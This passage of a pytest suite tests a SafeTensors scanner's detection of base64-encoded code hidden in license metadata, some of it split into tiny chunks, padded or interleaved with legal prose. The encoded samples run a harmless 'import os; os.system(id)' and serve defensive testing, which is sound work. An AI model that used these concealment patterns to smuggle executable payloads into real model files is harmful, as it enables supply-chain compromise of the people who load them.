    write_raw_safetensors(
        source_file,
        {
            "tensor": {"dtype": "U8", "shape": [1], "data_offsets": [0, 1]},
            "__metadata__": {"license": "https://opensource.org/licenses/MIT"},
        },
        b"\x00",
    )
    with zipfile.ZipFile(archive_path, "w") as archive:
        archive.write(source_file, arcname="nested/model.safetensors")
    source_file.unlink()

    result = scan_model_directory_or_file(str(archive_path), cache_scan_results=False)

    assert not [issue for issue in result.issues if issue.rule_code == "S905"]
    assert not [
        check for check in result.checks if check.name == "Metadata Pattern Check" and check.status.value == "failed"
    ]


def test_license_metadata_padded_blob_keeps_length_check(tmp_path: Path) -> None:
    file_path = tmp_path / "license_metadata_padded_blob.safetensors"
    payload = ordinary_license_text_with_url() + "\n" + ("A" * 5000)
    write_raw_safetensors(
        file_path,
        {
            "tensor": {"dtype": "U8", "shape": [1], "data_offsets": [0, 1]},
            "__metadata__": {"license": payload},
        },
        b"\x00",
    )

    result = SafeTensorsScanner().scan(str(file_path))

    assert "unusually_long_value" in result.metadata["custom_metadata_security_flags"]
    assert any(
        check.name == "Metadata Length Check"
        and check.status == CheckStatus.FAILED
        and check.details.get("key") == "license"
        for check in result.checks
    )


def test_license_metadata_wrapped_opaque_tail_keeps_length_check(tmp_path: Path) -> None:
    file_path = tmp_path / "license_metadata_wrapped_opaque_tail.safetensors"
    encoded_tail = "\n".join(f"Use {'QUJD' * 200}" for _ in range(20))
    payload = ordinary_license_text_with_url() + "\n" + encoded_tail
    write_raw_safetensors(
        file_path,
        {
            "tensor": {"dtype": "U8", "shape": [1], "data_offsets": [0, 1]},
            "__metadata__": {"license": payload},
        },
        b"\x00",
    )

    result = SafeTensorsScanner().scan(str(file_path))

    assert "unusually_long_value" in result.metadata["custom_metadata_security_flags"]
    assert any(
        check.name == "Metadata Length Check"
        and check.status == CheckStatus.FAILED
        and check.details.get("key") == "license"
        for check in result.checks
    )


def test_license_metadata_standard_wrapped_base64_tail_keeps_length_and_s905(tmp_path: Path) -> None:
    file_path = tmp_path / "license_metadata_standard_wrapped_base64_tail.safetensors"
    payload = f"{ordinary_license_text_with_url()}\n{standard_wrapped_base64_tail(line_count=3)}"
    write_raw_safetensors(
        file_path,
        {
            "tensor": {"dtype": "U8", "shape": [1], "data_offsets": [0, 1]},
            "__metadata__": {"license": payload},
        },
        b"\x00",
    )

    result = SafeTensorsScanner().scan(str(file_path))

    assert set(result.metadata["custom_metadata_security_flags"]) >= {"suspicious_pattern", "unusually_long_value"}
    assert any(issue.rule_code == "S905" and "license" in issue.message for issue in result.issues)
    assert any(
        check.name == "Metadata Length Check"
        and check.status == CheckStatus.FAILED
        and check.details.get("key") == "license"
        for check in result.checks
    )
    assert any(
        check.name == "Metadata Pattern Check"
        and check.status == CheckStatus.FAILED
        and check.details == {"key": "license", "pattern": "https?://"}
        for check in result.checks
    )


def test_long_license_metadata_wrapped_active_base64_tail_reports_wrapped_opaque_token(tmp_path: Path) -> None:
    file_path = tmp_path / "long_license_metadata_active_wrapped_base64_tail.safetensors"
    license_text = long_ordinary_license_text_with_incidental_tokens()
    tail = "\n".join(f"License grant continuation {line}" for line in executable_wrapped_base64_lines((31,)))
    payload = f"{license_text}\n{tail}"
    write_raw_safetensors(
        file_path,
        {
            "tensor": {"dtype": "U8", "shape": [1], "data_offsets": [0, 1]},
            "__metadata__": {"license": payload},
        },
        b"\x00",
    )

    result = SafeTensorsScanner().scan(str(file_path))

    assert len(payload) > 1000
    assert "http://" not in payload
    assert "https://" not in payload
    assert not SafeTensorsScanner._is_ordinary_license_metadata_value("license", payload, metadata_is_valid=True)
    assert set(result.metadata["custom_metadata_security_flags"]) >= {"suspicious_pattern", "unusually_long_value"}
    assert any(issue.rule_code == "S905" and "license" in issue.message for issue in result.issues)
    assert any(
        check.name == "Metadata Length Check"
        and check.status == CheckStatus.FAILED
        and check.details.get("key") == "license"
        for check in result.checks
    )
    assert any(
        check.name == "Metadata Pattern Check"
        and check.status == CheckStatus.FAILED
        and check.details == {"key": "license", "pattern": "wrapped-opaque-token"}
        for check in result.checks
    )


@pytest.mark.parametrize(
    ("tail", "file_stem"),
    [
        (
            "\n\n".join(f"  {line}\t" for line in executable_wrapped_base64_lines()),
            "whitespace_wrapped",
        ),
        (
            "\n".join(f"License grant continuation {line}" for line in executable_wrapped_base64_lines()),
            "license_prefixed",
        ),
        (
            "\n".join(f"# license terms {line}" for line in executable_wrapped_base64_lines()),
            "comment_prefixed",
        ),
        (
            "\n".join(f"{line} # license terms" for line in executable_wrapped_base64_lines()),
            "comment_suffixed",
        ),
        (
            "\n".join(f"License grant continuation {line}" for line in executable_wrapped_base64_lines((64, 76, 52))),
            "mixed_width_prefixed",
        ),
        (
            "\n".join(f"License grant continuation {line}" for line in executable_wrapped_base64_lines((15,))),
            "narrow_prefixed",
        ),
        (
            "\n".join(f"License grant {line}" for line in executable_wrapped_base64_lines((4,))),
            "quantum_prefixed",
        ),
        (
            "\n".join(f"License grant {line} under terms" for line in executable_wrapped_base64_lines((4,))),
            "infix_prefixed",
        ),
        (
            "\n".join(f"License grant {line}" for line in padded_executable_wrapped_base64_lines()),
            "padded_prefixed",
        ),
        (
            f"License grant {short_executable_base64_tail()} under terms",
            "short_active",
        ),
        (
            f"License grant {short_import_gadget_base64_tail()} under terms",
            "short_import_gadget",
        ),
        (
            "\nThis license paragraph continues under applicable law.\n".join(executable_wrapped_base64_lines((76,))),
            "legal_separator",
        ),
        (
            "\n".join(executable_wrapped_base64_lines((4,))),
            "tiny_width",
        ),
        (
            "\n".join(executable_wrapped_base64_lines((31,))),
            "short_width",
        ),
        (
            comment_separated_executable_wrapped_base64_tail(),
            "comment_separated",
        ),
    ],
)
def test_license_metadata_annotated_wrapped_base64_tail_keeps_length_and_s905(
    tmp_path: Path,
    tail: str,
    file_stem: str,
) -> None:
    file_path = tmp_path / f"{file_stem}_license_metadata.safetensors"
    payload = f"{ordinary_license_text_with_url()}\n{tail}"
    write_raw_safetensors(
        file_path,
        {
            "tensor": {"dtype": "U8", "shape": [1], "data_offsets": [0, 1]},
            "__metadata__": {"license": payload},
        },
        b"\x00",
    )

    result = SafeTensorsScanner().scan(str(file_path))

    assert not SafeTensorsScanner._looks_like_ordinary_license_document(payload)
    assert set(result.metadata["custom_metadata_security_flags"]) >= {"suspicious_pattern", "unusually_long_value"}
    assert any(issue.rule_code == "S905" and "license" in issue.message for issue in result.issues)
    assert any(
        check.name == "Metadata Length Check"
        and check.status == CheckStatus.FAILED
        and check.details.get("key") == "license"
        for check in result.checks
    )
    assert any(
        check.name == "Metadata Pattern Check"
        and check.status == CheckStatus.FAILED
        and check.details == {"key": "license", "pattern": "https?://"}
        for check in result.checks
    )


def test_license_metadata_padded_short_import_gadget_base64_keeps_length_and_s905(tmp_path: Path) -> None:
    file_path = tmp_path / "padded_short_import_gadget_license_metadata.safetensors"
    encoded_gadget = short_import_gadget_base64_tail()
    padded_tail = (
        "License grant terms permission reproduce distribute applicable law " * 8
        + encoded_gadget
        + " license terms permission reproduce distribute applicable law" * 8
    )
    nonspace_len = sum(1 for char in padded_tail if not char.isspace())
    payload = f"{ordinary_license_text_with_url()}\n{padded_tail}"
    write_raw_safetensors(
        file_path,
        {
            "tensor": {"dtype": "U8", "shape": [1], "data_offsets": [0, 1]},
            "__metadata__": {"license": payload},
        },
        b"\x00",
    )

    result = SafeTensorsScanner().scan(str(file_path))

    assert len(encoded_gadget) / nonspace_len < _BASE64_LICENSE_WRAP_MIN_FRAGMENT_RATIO
    assert not SafeTensorsScanner._is_ordinary_license_metadata_value("license", payload, metadata_is_valid=True)
    assert set(result.metadata["custom_metadata_security_flags"]) >= {"suspicious_pattern", "unusually_long_value"}
    assert any(issue.rule_code == "S905" and "license" in issue.message for issue in result.issues)
    assert any(
        check.name == "Metadata Length Check"
        and check.status == CheckStatus.FAILED
        and check.details.get("key") == "license"
        for check in result.checks
    )
    assert any(
        check.name == "Metadata Pattern Check"
        and check.status == CheckStatus.FAILED
        and check.details == {"key": "license", "pattern": "https?://"}
        for check in result.checks
    )


def test_license_metadata_two_low_ratio_chunks_on_one_line_keep_length_and_s905(tmp_path: Path) -> None:
    file_path = tmp_path / "two_low_ratio_chunks_license_metadata.safetensors"
    encoded_gadget = short_import_gadget_base64_tail()
    first_chunk = encoded_gadget[: len(encoded_gadget) // 2]
    second_chunk = encoded_gadget[len(encoded_gadget) // 2 :]
    documentary_padding = "License grant terms permission reproduce distribute applicable law " * 4
    tail = f"{documentary_padding}{first_chunk} {documentary_padding}{second_chunk} {documentary_padding}"
    nonspace_len = sum(1 for char in tail if not char.isspace())
    payload = f"{ordinary_license_text_with_url()}\n{tail}"
    write_raw_safetensors(
        file_path,
        {
            "tensor": {"dtype": "U8", "shape": [1], "data_offsets": [0, 1]},
            "__metadata__": {"license": payload},
        },
        b"\x00",
    )

    result = SafeTensorsScanner().scan(str(file_path))

    assert len(first_chunk) / nonspace_len < _BASE64_LICENSE_WRAP_MIN_FRAGMENT_RATIO
    assert len(second_chunk) / nonspace_len < _BASE64_LICENSE_WRAP_MIN_FRAGMENT_RATIO
    assert not SafeTensorsScanner._is_ordinary_license_metadata_value("license", payload, metadata_is_valid=True)
    assert set(result.metadata["custom_metadata_security_flags"]) >= {"suspicious_pattern", "unusually_long_value"}
    assert any(issue.rule_code == "S905" and "license" in issue.message for issue in result.issues)
    assert any(
        check.name == "Metadata Length Check"
        and check.status == CheckStatus.FAILED
        and check.details.get("key") == "license"
        for check in result.checks
    )
    assert any(
        check.name == "Metadata Pattern Check"
        and check.status == CheckStatus.FAILED
        and check.details == {"key": "license", "pattern": "https?://"}
        for check in result.checks
    )


def test_license_metadata_shell_payload_base64_keeps_length_and_s905(tmp_path: Path) -> None:
    file_path = tmp_path / "shell_payload_license_metadata.safetensors"
    payload = f"{ordinary_license_text_with_url()}\nLicense grant {short_shell_payload_base64_tail()} under terms"
    write_raw_safetensors(
        file_path,
        {
            "tensor": {"dtype": "U8", "shape": [1], "data_offsets": [0, 1]},
            "__metadata__": {"license": payload},
        },
        b"\x00",
    )

    result = SafeTensorsScanner().scan(str(file_path))

    assert not SafeTensorsScanner._is_ordinary_license_metadata_value("license", payload, metadata_is_valid=True)
    assert set(result.metadata["custom_metadata_security_flags"]) >= {"suspicious_pattern", "unusually_long_value"}
    assert any(issue.rule_code == "S905" and "license" in issue.message for issue in result.issues)
    assert any(
        check.name == "Metadata Length Check"
        and check.status == CheckStatus.FAILED
        and check.details.get("key") == "license"
        for check in result.checks
    )
    assert any(
        check.name == "Metadata Pattern Check"
        and check.status == CheckStatus.FAILED
        and check.details == {"key": "license", "pattern": "https?://"}
        for check in result.checks
    )


def test_license_metadata_annotated_tiny_base64_chunks_keep_length_pattern_and_s905(tmp_path: Path) -> None:
    file_path = tmp_path / "annotated_tiny_short_import_gadget_license_metadata.safetensors"
    encoded_gadget = short_import_gadget_base64_tail()
    chunks = [encoded_gadget[index : index + 4] for index in range(0, len(encoded_gadget), 4)]
    wrapped_lines = [
        (
            "License grant terms permission reproduce distribute applicable law "
            f"{chunk} "
            "license terms permission reproduce distribute applicable law"
        )
        for chunk in chunks
    ]
    wrapped_tail = "\n".join(wrapped_lines)
    payload = f"{ordinary_license_text_with_url()}\n{wrapped_tail}"
    write_raw_safetensors(
        file_path,
        {
            "tensor": {"dtype": "U8", "shape": [1], "data_offsets": [0, 1]},
            "__metadata__": {"license": payload},
        },
        b"\x00",
    )

    result = SafeTensorsScanner().scan(str(file_path))

    assert all(
        len(chunk) / sum(1 for char in line if not char.isspace()) < _BASE64_LICENSE_WRAP_MIN_FRAGMENT_RATIO
        for chunk, line in zip(chunks, wrapped_lines, strict=True)
    )
    assert not SafeTensorsScanner._is_ordinary_license_metadata_value("license", payload, metadata_is_valid=True)
    assert set(result.metadata["custom_metadata_security_flags"]) >= {"suspicious_pattern", "unusually_long_value"}
    assert any(issue.rule_code == "S905" and "license" in issue.message for issue in result.issues)
    assert any(
        check.name == "Metadata Length Check"
        and check.status == CheckStatus.FAILED
        and check.details.get("key") == "license"
        for check in result.checks
    )
    assert any(
        check.name == "Metadata Pattern Check"
        and check.status == CheckStatus.FAILED
        and check.details == {"key": "license", "pattern": "https?://"}
        for check in result.checks
    )


def test_license_metadata_invalid_wrapped_base64_modulo_one_fails_closed(tmp_path: Path) -> None:
    file_path = tmp_path / "invalid_modulo_one_wrapped_base64_license_metadata.safetensors"
    invalid_tail = ("QUJD" * 6) + "A"
    payload = f"{ordinary_license_text_with_url()}\n{invalid_tail}"
    write_raw_safetensors(
        file_path,
        {
            "tensor": {"dtype": "U8", "shape": [1], "data_offsets": [0, 1]},
            "__metadata__": {"license": payload},
        },
        b"\x00",
    )

    result = SafeTensorsScanner().scan(str(file_path))

    assert len(invalid_tail) % 4 == 1
    assert not SafeTensorsScanner._is_ordinary_license_metadata_value("license", payload, metadata_is_valid=True)
    assert set(result.metadata["custom_metadata_security_flags"]) >= {"suspicious_pattern", "unusually_long_value"}
    assert any(issue.rule_code == "S905" and "license" in issue.message for issue in result.issues)
    assert any(
        check.name == "Metadata Pattern Check"
        and check.status == CheckStatus.FAILED
        and check.details == {"key": "license", "pattern": "https?://"}
        for check in result.checks
    )


@pytest.mark.parametrize("chunk_size", [2, 3])
def test_license_metadata_invalid_modulo_one_tiny_chunks_fail_closed(
    tmp_path: Path,
    chunk_size: int,
) -> None:
    file_path = tmp_path / f"invalid_modulo_one_{chunk_size}_char_license_metadata.safetensors"
    invalid_tail = ("QUJD" * 6) + "A"
    chunks = [invalid_tail[index : index + chunk_size] for index in range(0, len(invalid_tail), chunk_size)]
    wrapped_tail = "\n".join(f"License grant {chunk} under terms" for chunk in chunks)
    payload = f"{ordinary_license_text_with_url()}\n{wrapped_tail}"
    write_raw_safetensors(
        file_path,
        {
            "tensor": {"dtype": "U8", "shape": [1], "data_offsets": [0, 1]},
            "__metadata__": {"license": payload},
        },
        b"\x00",
    )

    result = SafeTensorsScanner().scan(str(file_path))

    assert len(invalid_tail) % 4 == 1
    assert any(len(chunk) == 1 for chunk in chunks)
    assert not SafeTensorsScanner._is_ordinary_license_metadata_value("license", payload, metadata_is_valid=True)
    assert set(result.metadata["custom_metadata_security_flags"]) >= {"suspicious_pattern", "unusually_long_value"}
    assert any(issue.rule_code == "S905" and "license" in issue.message for issue in result.issues)
    assert any(
        check.name == "Metadata Pattern Check"
        and check.status == CheckStatus.FAILED
        and check.details == {"key": "license", "pattern": "https?://"}
        for check in result.checks
    )


@pytest.mark.parametrize("chunk_size", [2, 3])
@pytest.mark.parametrize("line_template", ["License grant {chunk}", "{chunk} under terms"])
def test_license_metadata_invalid_modulo_one_tiny_prefix_suffix_chunks_fail_closed(
    tmp_path: Path,
    chunk_size: int,
    line_template: str,
) -> None:
    file_path = tmp_path / f"invalid_modulo_one_{chunk_size}_char_prefix_suffix_license_metadata.safetensors"
    invalid_tail = ("QUJD" * 6) + "A"
    chunks = [invalid_tail[index : index + chunk_size] for index in range(0, len(invalid_tail), chunk_size)]
    wrapped_tail = "\n".join(line_template.format(chunk=chunk) for chunk in chunks)
    payload = f"{ordinary_license_text_with_url()}\n{wrapped_tail}"
    write_raw_safetensors(
        file_path,
        {
            "tensor": {"dtype": "U8", "shape": [1], "data_offsets": [0, 1]},
            "__metadata__": {"license": payload},
        },
        b"\x00",
    )

    result = SafeTensorsScanner().scan(str(file_path))

    assert len(invalid_tail) % 4 == 1
    assert not SafeTensorsScanner._is_ordinary_license_metadata_value("license", payload, metadata_is_valid=True)
    assert set(result.metadata["custom_metadata_security_flags"]) >= {"suspicious_pattern", "unusually_long_value"}
    assert any(issue.rule_code == "S905" and "license" in issue.message for issue in result.issues)


@pytest.mark.parametrize("chunk_size", [2, 3])
def test_license_metadata_unpadded_tiny_base64_chunks_reconstruct_active_payload(
    tmp_path: Path,
    chunk_size: int,
) -> None:
    file_path = tmp_path / f"unpadded_{chunk_size}_char_base64_license_metadata.safetensors"
    encoded_payload = base64.b64encode(b"import os\nos.system('id')\n#").decode("ascii").rstrip("=")
    chunks = [encoded_payload[index : index + chunk_size] for index in range(0, len(encoded_payload), chunk_size)]
    wrapped_tail = "\n".join(f"License grant {chunk} under terms" for chunk in chunks)
    payload = f"{ordinary_license_text_with_url()}\n{wrapped_tail}"
    write_raw_safetensors(
        file_path,
        {
            "tensor": {"dtype": "U8", "shape": [1], "data_offsets": [0, 1]},
            "__metadata__": {"license": payload},
        },
        b"\x00",
    )

    result = SafeTensorsScanner().scan(str(file_path))

    assert all(2 <= len(chunk) <= 3 and "=" not in chunk for chunk in chunks)
    assert not SafeTensorsScanner._is_ordinary_license_metadata_value("license", payload, metadata_is_valid=True)
    assert set(result.metadata["custom_metadata_security_flags"]) >= {"suspicious_pattern", "unusually_long_value"}
    assert any(issue.rule_code == "S905" and "license" in issue.message for issue in result.issues)
    assert any(
        check.name == "Metadata Pattern Check"
        and check.status == CheckStatus.FAILED
        and check.details == {"key": "license", "pattern": "https?://"}
        for check in result.checks
    )


@pytest.mark.parametrize("chunk_size", [2, 3])
@pytest.mark.parametrize("line_template", ["License grant {chunk}", "{chunk} under terms"])
def test_license_metadata_unpadded_tiny_prefix_suffix_chunks_reconstruct_active_payload(
    tmp_path: Path,
    chunk_size: int,
    line_template: str,
) -> None:
    file_path = tmp_path / f"unpadded_{chunk_size}_char_prefix_suffix_license_metadata.safetensors"
    encoded_payload = base64.b64encode(b"import os\nos.system('id')\n#").decode("ascii").rstrip("=")
    chunks = [encoded_payload[index : index + chunk_size] for index in range(0, len(encoded_payload), chunk_size)]
    wrapped_tail = "\n".join(line_template.format(chunk=chunk) for chunk in chunks)
    payload = f"{ordinary_license_text_with_url()}\n{wrapped_tail}"
    write_raw_safetensors(
        file_path,
        {
            "tensor": {"dtype": "U8", "shape": [1], "data_offsets": [0, 1]},
            "__metadata__": {"license": payload},
        },
        b"\x00",
    )

    result = SafeTensorsScanner().scan(str(file_path))

    assert all(1 <= len(chunk) <= 3 and "=" not in chunk for chunk in chunks)
    assert not SafeTensorsScanner._is_ordinary_license_metadata_value("license", payload, metadata_is_valid=True)
    assert set(result.metadata["custom_metadata_security_flags"]) >= {"suspicious_pattern", "unusually_long_value"}
    assert any(issue.rule_code == "S905" and "license" in issue.message for issue in result.issues)


@pytest.mark.parametrize("chunk_size", [1, 2, 3])
@pytest.mark.parametrize("line_template", ["License to use {chunk} under terms", "License to use {chunk} and terms"])
def test_license_metadata_unpadded_tiny_chunks_ignore_documentary_short_words(
    tmp_path: Path,
    chunk_size: int,
    line_template: str,
) -> None:
    file_path = tmp_path / f"unpadded_{chunk_size}_char_extra_short_words_license_metadata.safetensors"
    encoded_payload = base64.b64encode(b"import os\nos.system('id')\n#").decode("ascii").rstrip("=")
    chunks = [encoded_payload[index : index + chunk_size] for index in range(0, len(encoded_payload), chunk_size)]
    wrapped_tail = "\n".join(line_template.format(chunk=chunk) for chunk in chunks)
    payload = f"{ordinary_license_text_with_url()}\n{wrapped_tail}"
    write_raw_safetensors(
        file_path,
        {
            "tensor": {"dtype": "U8", "shape": [1], "data_offsets": [0, 1]},
            "__metadata__": {"license": payload},
        },
        b"\x00",
    )

    result = SafeTensorsScanner().scan(str(file_path))

    assert not SafeTensorsScanner._is_ordinary_license_metadata_value("license", payload, metadata_is_valid=True)
    assert set(result.metadata["custom_metadata_security_flags"]) >= {"suspicious_pattern", "unusually_long_value"}
    assert any(issue.rule_code == "S905" and "license" in issue.message for issue in result.issues)


@pytest.mark.parametrize("chunk_size", [1, 2, 3])
def test_license_metadata_bare_tiny_chunks_between_documentary_prose_reconstruct_active_payload(
    tmp_path: Path,
    chunk_size: int,
) -> None:
    file_path = tmp_path / f"bare_{chunk_size}_char_base64_license_metadata.safetensors"
    encoded_payload = base64.b64encode(b"import os\nos.system('id')\n").decode("ascii").rstrip("=")
    chunks = [encoded_payload[index : index + chunk_size] for index in range(0, len(encoded_payload), chunk_size)]
    separator = "License terms grant permission reproduce distribute work."
    wrapped_tail = f"\n{separator}\n".join(chunks)
    payload = f"{ordinary_license_text_with_url()}\n{wrapped_tail}"
    write_raw_safetensors(
        file_path,
        {
            "tensor": {"dtype": "U8", "shape": [1], "data_offsets": [0, 1]},
            "__metadata__": {"license": payload},
        },
        b"\x00",
    )

    result = SafeTensorsScanner().scan(str(file_path))

    assert all(1 <= len(chunk) <= 3 and "=" not in chunk for chunk in chunks)
    assert not SafeTensorsScanner._is_ordinary_license_metadata_value("license", payload, metadata_is_valid=True)
    assert set(result.metadata["custom_metadata_security_flags"]) >= {"suspicious_pattern", "unusually_long_value"}
    assert any(issue.rule_code == "S905" and "license" in issue.message for issue in result.issues)


def test_license_metadata_bare_short_documentary_lines_between_prose_stay_clean(tmp_path: Path) -> None:
    file_path = tmp_path / "bare_short_documentary_lines_license_metadata.safetensors"
    separator = "License terms grant permission reproduce distribute work."
    wrapped_terms = f"\n{separator}\n".join(["Use", "May", "Law"] * 8)
    payload = f"{ordinary_license_text_with_url()}\n{wrapped_terms}"
    write_raw_safetensors(
        file_path,
        {
            "tensor": {"dtype": "U8", "shape": [1], "data_offsets": [0, 1]},
            "__metadata__": {"license": payload},
        },
        b"\x00",
    )

    result = SafeTensorsScanner().scan(str(file_path))

    assert SafeTensorsScanner._is_ordinary_license_metadata_value("license", payload, metadata_is_valid=True)
    assert result.metadata["custom_metadata_security_flags"] == []
    assert all("license" not in issue.message for issue in result.issues)


@pytest.mark.parametrize("line_template", ["License to use {chunk} under terms", "License to use {chunk} and terms"])
def test_license_metadata_word_like_chunk_with_extra_short_words_reconstructs_active_payload(
    tmp_path: Path,
    line_template: str,
) -> None:
    file_path = tmp_path / "word_like_chunk_extra_short_words_license_metadata.safetensors"
    encoded_payload = base64.b64encode(b"o import os\nos.system('id')\n").decode("ascii").rstrip("=")
    chunks = [encoded_payload[index : index + 2] for index in range(0, len(encoded_payload), 2)]
    wrapped_tail = "\n".join(line_template.format(chunk=chunk) for chunk in chunks)
    payload = f"{ordinary_license_text_with_url()}\n{wrapped_tail}"
    write_raw_safetensors(
        file_path,
        {
            "tensor": {"dtype": "U8", "shape": [1], "data_offsets": [0, 1]},
            "__metadata__": {"license": payload},
        },
        b"\x00",
    )

    result = SafeTensorsScanner().scan(str(file_path))

    assert "by" in chunks
    assert not SafeTensorsScanner._is_ordinary_license_metadata_value("license", payload, metadata_is_valid=True)
    assert set(result.metadata["custom_metadata_security_flags"]) >= {"suspicious_pattern", "unusually_long_value"}
    assert any(issue.rule_code == "S905" and "license" in issue.message for issue in result.issues)


def test_license_metadata_unpadded_tiny_word_like_chunk_reconstructs_active_payload(tmp_path: Path) -> None:
    file_path = tmp_path / "unpadded_word_like_base64_license_metadata.safetensors"
    encoded_payload = base64.b64encode(b"o import os\nos.system('id')\n").decode("ascii").rstrip("=")
    chunks = [encoded_payload[index : index + 2] for index in range(0, len(encoded_payload), 2)]
    wrapped_tail = "\n".join(f"License grant {chunk} under terms" for chunk in chunks)
    payload = f"{ordinary_license_text_with_url()}\n{wrapped_tail}"
    write_raw_safetensors(
        file_path,
        {
            "tensor": {"dtype": "U8", "shape": [1], "data_offsets": [0, 1]},
            "__metadata__": {"license": payload},
        },
        b"\x00",
    )

    result = SafeTensorsScanner().scan(str(file_path))

    assert "by" in chunks
    assert not SafeTensorsScanner._is_ordinary_license_metadata_value("license", payload, metadata_is_valid=True)
    assert set(result.metadata["custom_metadata_security_flags"]) >= {"suspicious_pattern", "unusually_long_value"}
    assert any(issue.rule_code == "S905" and "license" in issue.message for issue in result.issues)


def test_license_metadata_repeated_short_documentary_words_stays_clean(tmp_path: Path) -> None:
    file_path = tmp_path / "short_documentary_words_license_metadata.safetensors"
    repeated_terms = "\n".join("License to use under applicable terms." for _ in range(80))
    payload = f"{ordinary_license_text_with_url()}\n{repeated_terms}"
    write_raw_safetensors(
        file_path,
        {
            "tensor": {"dtype": "U8", "shape": [1], "data_offsets": [0, 1]},
            "__metadata__": {"license": payload},
        },
        b"\x00",
    )

    result = SafeTensorsScanner().scan(str(file_path))

    assert SafeTensorsScanner._is_ordinary_license_metadata_value("license", payload, metadata_is_valid=True)
    assert result.metadata["custom_metadata_security_flags"] == []
    assert all("license" not in issue.message for issue in result.issues)


def test_license_metadata_short_documentary_words_with_trailing_separator_stays_clean(tmp_path: Path) -> None:
    file_path = tmp_path / "short_documentary_words_separator_license_metadata.safetensors"
    separator = "\n".join("License terms grant permission reproduce distribute work." for _ in range(5))
    repeated_terms = f"\n{separator}\n".join("License grant by terms" for _ in range(4))
    payload = f"{ordinary_license_text_with_url()}\n{repeated_terms}\n{separator}"
    write_raw_safetensors(
        file_path,
        {
            "tensor": {"dtype": "U8", "shape": [1], "data_offsets": [0, 1]},
            "__metadata__": {"license": payload},
        },
        b"\x00",
    )

    result = SafeTensorsScanner().scan(str(file_path))

    assert SafeTensorsScanner._is_ordinary_license_metadata_value("license", payload, metadata_is_valid=True)
    assert result.metadata["custom_metadata_security_flags"] == []
    assert all("license" not in issue.message for issue in result.issues)


def test_license_metadata_documentary_heading_with_trailing_separator_stays_clean(tmp_path: Path) -> None:
    file_path = tmp_path / "documentary_heading_separator_license_metadata.safetensors"
    separator = "\n".join("License terms grant permission reproduce distribute work." for _ in range(5))
    payload = f"{ordinary_license_text_with_url()}\nCopyright\n{separator}"
    write_raw_safetensors(
        file_path,
        {
            "tensor": {"dtype": "U8", "shape": [1], "data_offsets": [0, 1]},
            "__metadata__": {"license": payload},
        },
        b"\x00",
    )

    result = SafeTensorsScanner().scan(str(file_path))

    assert SafeTensorsScanner._is_ordinary_license_metadata_value("license", payload, metadata_is_valid=True)
    assert result.metadata["custom_metadata_security_flags"] == []
    assert all("license" not in issue.message for issue in result.issues)


@pytest.mark.parametrize("line", ["License grant by", "by under terms"])
def test_license_metadata_short_documentary_prefix_suffix_words_stay_clean(tmp_path: Path, line: str) -> None:
    file_path = tmp_path / "short_documentary_prefix_suffix_words_license_metadata.safetensors"
    repeated_terms = "\n".join(line for _ in range(80))
    payload = f"{ordinary_license_text_with_url()}\n{repeated_terms}"
    write_raw_safetensors(
        file_path,
        {
            "tensor": {"dtype": "U8", "shape": [1], "data_offsets": [0, 1]},
            "__metadata__": {"license": payload},
        },
        b"\x00",
    )

    result = SafeTensorsScanner().scan(str(file_path))

    assert SafeTensorsScanner._is_ordinary_license_metadata_value("license", payload, metadata_is_valid=True)
    assert result.metadata["custom_metadata_security_flags"] == []
    assert all("license" not in issue.message for issue in result.issues)


def test_license_metadata_separator_overflow_between_short_chunks_fails_closed(tmp_path: Path) -> None:
    file_path = tmp_path / "separator_overflow_wrapped_base64_license_metadata.safetensors"
    encoded_payload = base64.b64encode(b"import os\nos.system('id')\n").decode("ascii").rstrip("=")
    chunks = [encoded_payload[index : index + 12] for index in range(0, len(encoded_payload), 12)]
    separator = "\n".join("License terms grant permission reproduce distribute work." for _ in range(5))
    wrapped_tail = f"\n{separator}\n".join(chunks)
    payload = f"{ordinary_license_text_with_url()}\n{wrapped_tail}"
    write_raw_safetensors(
        file_path,
        {
            "tensor": {"dtype": "U8", "shape": [1], "data_offsets": [0, 1]},
            "__metadata__": {"license": payload},
        },
        b"\x00",
    )

    result = SafeTensorsScanner().scan(str(file_path))

    assert all(8 <= len(chunk) <= 20 for chunk in chunks)
    assert not SafeTensorsScanner._is_ordinary_license_metadata_value("license", payload, metadata_is_valid=True)
    assert set(result.metadata["custom_metadata_security_flags"]) >= {"suspicious_pattern", "unusually_long_value"}
    assert any(issue.rule_code == "S905" and "license" in issue.message for issue in result.issues)
    assert any(
        check.name == "Metadata Pattern Check"
        and check.status == CheckStatus.FAILED
        and check.details == {"key": "license", "pattern": "https?://"}
        for check in result.checks
    )


def test_license_metadata_separator_overflow_between_four_char_chunks_fails_closed(tmp_path: Path) -> None:
    file_path = tmp_path / "separator_overflow_four_char_license_metadata.safetensors"
    encoded_payload = base64.b64encode(b"import os\nos.system('id')\n").decode("ascii").rstrip("=")
    chunks = [encoded_payload[index : index + 4] for index in range(0, len(encoded_payload), 4)]
    separator = "\n".join("License terms grant permission reproduce distribute work." for _ in range(5))
    wrapped_tail = f"\n{separator}\n".join(chunks)
    payload = f"{ordinary_license_text_with_url()}\n{wrapped_tail}"
    write_raw_safetensors(
        file_path,
        {
            "tensor": {"dtype": "U8", "shape": [1], "data_offsets": [0, 1]},
            "__metadata__": {"license": payload},
        },
        b"\x00",
    )

    result = SafeTensorsScanner().scan(str(file_path))

    assert any(len(chunk) == 4 for chunk in chunks)
    assert all(1 <= len(chunk) <= 4 for chunk in chunks)
    assert not SafeTensorsScanner._is_ordinary_license_metadata_value("license", payload, metadata_is_valid=True)
    assert set(result.metadata["custom_metadata_security_flags"]) >= {"suspicious_pattern", "unusually_long_value"}
    assert any(issue.rule_code == "S905" and "license" in issue.message for issue in result.issues)
    assert any(
        check.name == "Metadata Pattern Check"
        and check.status == CheckStatus.FAILED
        and check.details == {"key": "license", "pattern": "https?://"}
        for check in result.checks
    )


@pytest.mark.parametrize("chunk_size", [2, 3])
def test_license_metadata_unpadded_tiny_chunks_survive_separator_overflow(
    tmp_path: Path,
    chunk_size: int,
) -> None:
    file_path = tmp_path / f"unpadded_{chunk_size}_char_separator_overflow_license_metadata.safetensors"
    encoded_payload = base64.b64encode(b"import os\nos.system('id')\n#").decode("ascii").rstrip("=")
    chunks = [encoded_payload[index : index + chunk_size] for index in range(0, len(encoded_payload), chunk_size)]
    separator = "\n".join("License terms grant permission reproduce distribute work." for _ in range(5))
    wrapped_tail = f"\n{separator}\n".join(f"License grant {chunk} under terms" for chunk in chunks)
    payload = f"{ordinary_license_text_with_url()}\n{wrapped_tail}"
    write_raw_safetensors(
        file_path,
        {
